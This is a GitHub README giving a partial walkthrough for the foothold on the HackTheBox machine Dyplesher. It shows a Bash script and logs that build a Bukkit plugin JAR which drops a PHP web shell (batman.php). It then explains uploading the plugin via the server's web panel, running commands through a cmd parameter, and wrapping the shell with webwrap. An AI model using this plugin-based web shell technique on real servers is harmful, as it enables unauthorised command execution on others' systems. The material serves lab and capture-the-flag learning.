# HTB-Dyplesher :alien:
# Warning message
**This is _not_ a complete write-up for the Dyplesher (10.10.10.190), box always active (27-09-2020), just a small nudge for the foothold part.**

**I developed this Bash script and use these files because I didn't want to depend/use on a heavy Integrated Development Environment (IDE).**
# Description
Ceate a Bukkit plugin without using an IDE. This is a simple build script written in Bash to create your Java archive data (JAR) from a Linux platform.

The JAR file will create a PHP web shell.

I used it on the box Dyplesher from HackTheBox platform to obtain the first "pseudo" shell on the box.

(source: https://bukkit.org/threads/creating-plugin-without-an-ide.136603/page-2)
# Usage/Installation
Unzip the zip file and execute the Bash script:
```
git clone https://github.com/choupit0/HTB-Dyplesher.git
cd HTB-Dyplesher
unzip payload.zip
cd payload/
./Compile.sh
```
# Logs

```
root@HTB:~# git clone https://github.com/choupit0/HTB-Dyplesher.git
Cloning into 'HTB-Dyplesher'...
Username for 'https://github.com': choupit0
Password for 'https://choupit0@github.com':
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (6/6), 17.05 MiB | 4.38 MiB/s, done.
```

```
root@HTB:~# cd HTB-Dyplesher/
root@HTB:~/HTB-Dyplesher# unzip payload.zip
Archive:  payload.zip
   creating: payload/
   creating: payload/htb/
   creating: payload/htb/dyplesher/
   creating: payload/htb/dyplesher/plugin/
  inflating: payload/htb/dyplesher/plugin/CreateFile.java
   creating: payload/lib/
  inflating: payload/lib/spigot-1.8.jar
   creating: payload/bin/
   creating: payload/bin/htb/
   creating: payload/bin/htb/dyplesher/
   creating: payload/bin/htb/dyplesher/plugin/
  inflating: payload/Compile.sh
   creating: payload/src/
  inflating: payload/src/plugin.yml
```

```
root@HTB:~/HTB-Dyplesher# tree
.
├── payload
│   ├── bin
│   │   └── htb
│   │       └── dyplesher
│   │           └── plugin
│   ├── Compile.sh
│   ├── htb
│   │   └── dyplesher
│   │       └── plugin
│   │           └── CreateFile.java
│   ├── lib
│   │   └── spigot-1.8.jar
│   └── src
│       └── plugin.yml
├── payload.zip
└── README.md

10 directories, 6 files
```

```
root@HTB:~/HTB-Dyplesher# cd payload/
root@HTB:~/HTB-Dyplesher/payload# ./Compile.sh
added manifest
adding: htb/(in = 0) (out= 0)(stored 0%)
adding: htb/dyplesher/(in = 0) (out= 0)(stored 0%)
adding: htb/dyplesher/plugin/(in = 0) (out= 0)(stored 0%)
adding: htb/dyplesher/plugin/CreateFile.class(in = 1410) (out= 847)(deflated 39%)
adding: plugin.yml(in = 187) (out= 146)(deflated 21%)
```

Our JAR file named "createfile.jar" has been created:
```
root@HTB:~/HTB-Dyplesher/payload# tree
.
├── bin
│   ├── htb
│   │   └── dyplesher
│   │       └── plugin
│   │           └── CreateFile.class
│   └── plugin.yml
├── Compile.sh
├── createfile.jar
├── htb
│   └── dyplesher
│       └── plugin
│           └── CreateFile.java
├── lib
│   └── spigot-1.8.jar
└── src
    └── plugin.yml

9 directories, 7 files
```
# Obtaining a "pseudo" shell
Put in your hosts file: dyplesher.htb + [subdomain].dyplesher.htb = 10.10.10.190

Once you have you JAR file, add the plugin and reload it on the web interface:

http://dyplesher.htb/home/add
http://dyplesher.htb/home/reload

Then, check you can launch a PHP command:

http://[subdomain].dyplesher.htb/batman.php?cmd=id

uid=1001([user]) gid=1001([user]) groups=1001([user]),122([group])

Finally, install this great tool:

https://github.com/mxrch/webwrap

With your web shell you will be able to simulate a terminal:

```
root@HTB:~/HTB/Dyplesher/webwrap# ./webwrap http://[subdomain].dyplesher.htb/batman.php?cmd=WRAP

[user]@dyplesher:/var/www/[subdomain]$ ls
README.md
batman.php
index.php
```

I let you imagine the rest, no spoilers here ;)
